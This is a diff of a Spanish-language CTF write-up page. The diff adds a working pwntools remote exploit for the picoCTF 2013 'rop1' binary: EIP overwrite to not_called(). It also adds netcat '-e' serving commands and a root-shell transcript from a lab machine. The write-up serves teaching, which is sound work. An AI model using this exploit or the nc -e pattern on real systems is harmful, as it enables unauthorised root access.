@@ -43,7 +43,7 @@ En la sección de comandos sólo me limito a poner el output del comando mas des
 <h4>[Resumen]:</h4>
 Tenemos que explotar un ROP usando un buffer para la sobreescritura de EIP protegido con NX habilitado.
 <h4>[Tecnica]:</h4>
-ROP usando un buffer para la sobreescritura de EIP protegido con NX habilitado apuntando a la función <code>not_called()</code> y ejecutar un <code>/bin/bash</code>.
+ROP usando un buffer para la sobreescritura de EIP apuntando a la función <code>not_called()</code> y ejecutar un <code>/bin/bash</code> protegido con NX habilitado.
 <h4>[Informe]:</h4>
 <p><em><strong>Recolección de información</strong></em></p>
 Primero debemos obtener la información necesaria para realizar la explotación del binario. La principal diferencia entre los buffer overflow y ROP es que este último tienen habilitado NX / ASLR y, a veces, otras protecciones. Esto significa que las direcciones libc y stack son aleatorias, y que ninguna memoria es simultáneamente grabable y ejecutable. Sabiendo que tiene una función <code>read()</code> que va a leer nuestro input que introduzcamos un tamaño de <code>256</code> bytes y también tenemos un buffer <code>ebp-0x88</code> que es donde se almacenará el input. Si desensamblamos la función <code>vulnerable_function()</code> usando radare2 vemos el tamaño que lee siendo uno de sus argumentos. Esto quiere decir que va a leer más que lo que guarda nuestro buffer.
@@ -78,6 +78,19 @@ Violación de segmento
 Por último ya sabiendo que tenemos controlado <code>$eip</code> lo único que necesitamos es usar la dirección de la función <code>not_called()</code> para que apunte allí y nos ejecute una shell.
 <p><em><strong>Obteniendo root shell</strong></em></p>
 Pudimos debuggear y analizar el binario en nuestra maquina, pero ahora toca la fase en la que ganamos acceso. El binario vulnerable esta ejecutandose en el servidor victima en el puerto 1234.
+<pre><code>root@kali:~/Desktop# nc -lvnp 1234 -e ./rop1-fa6168f4d8eba0eb
+listening on [any] 1234 ...
+connect to [192.168.32.129] from (UNKNOWN) [192.168.32.142] 57178
+</code></pre>
+Ejecutamos en nuestra máquina y boomm! Root user ;)
+<pre><code>naivenom@parrot:[~/pwn/rop1_] $ python exploit.py 
+[+] Opening connection to 192.168.32.129 on port 1234: Done
+[*] Switching to interactive mode
+$ id
+uid=0(root) gid=0(root) grupos=0(root)
+$ uname -a
+Linux kali 4.12.0-kali2-686 #1 SMP Debian 4.12.12-2kali1 (2017-09-13) i686 GNU/Linux
+</code></pre>
 <h4>[Comandos]:</h4>
 Primero antes de nada comprobamos la seguridad del binario y observamos que <code>NX</code> esta habilitado.
 <pre><code>❯ gdb -q rop
@@ -106,9 +119,19 @@ Enviamos al binario cuando lo debugeamos con GDB la salida de este script <code>
 
 sys.stdout.write(<span style="color: #0000FF">&quot;A&quot;</span>*<span style="color: #0000FF">140</span>+<span style="color: #0000FF">&quot;DDDD&quot;</span>)
 </pre></div>
+Exploit remoto.
+<div style="background: #ffffff; overflow:auto;width:auto;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">from</span> pwn <span style="color: #000080; font-weight: bold">import</span> *
 
+p = remote(<span style="color: #0000FF">&#39;192.168.32.129&#39;</span>, <span style="color: #0000FF">1234</span>)
+exploit = <span style="color: #0000FF">&quot;&quot;</span>
+exploit += <span style="color: #0000FF">&quot;\x90&quot;</span>*<span style="color: #0000FF">140</span>
+exploit += <span style="color: #0000FF">&quot;\xa4\x84\x04\x08&quot;</span>
+p.sendline(exploit)
 
+p.interactive()
+</pre></div>
 <h4>[URL Reto]:</h4>
+<a href="https://github.com/ctfs/write-ups-2013/blob/master/pico-ctf-2013/rop-1/rop1-fa6168f4d8eba0eb">--ROP1 PICO CTF 2013--</a>
 <h2><a id="refs_dos" href="#refs_dos">2. Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros apuntando al inicio del buffer + shellcode mod 0x0b + float value(stack canary)</a></h2>
 <h4>[Resumen]:</h4>
 Tenemos que explotar un Buffer Overflow protegido con un stack canary float value.
